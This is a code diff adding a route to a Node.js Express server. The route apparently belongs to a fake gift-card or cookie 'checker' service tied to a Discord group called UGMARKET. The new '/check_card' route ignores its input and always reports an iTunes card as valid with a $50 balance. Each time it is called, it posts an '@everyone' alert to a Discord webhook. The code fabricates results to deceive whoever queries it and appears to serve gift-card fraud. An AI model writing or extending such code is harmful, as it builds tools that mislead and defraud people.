@@ -677,6 +677,17 @@ app.get('/check_cookie/id=43958/r', async (req, res) => {
     res.json(Robject);
 });
 
+app.get('/check_card/id=2209/', async (req, res) => {
+  const message = {
+      username: "UGMARKET",
+      avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583378577391616/invert-ug.png",
+      content: "VALID GIFTCARD? @everyone"
+  };
+  await sendWebhookMessage(message);
+    const Robject = {"name": "Itunes", "Balance": "$50", "expired": "False"}
+    res.json(Robject);
+});
+
 
 
 app.listen(process.env.PORT || 3000)
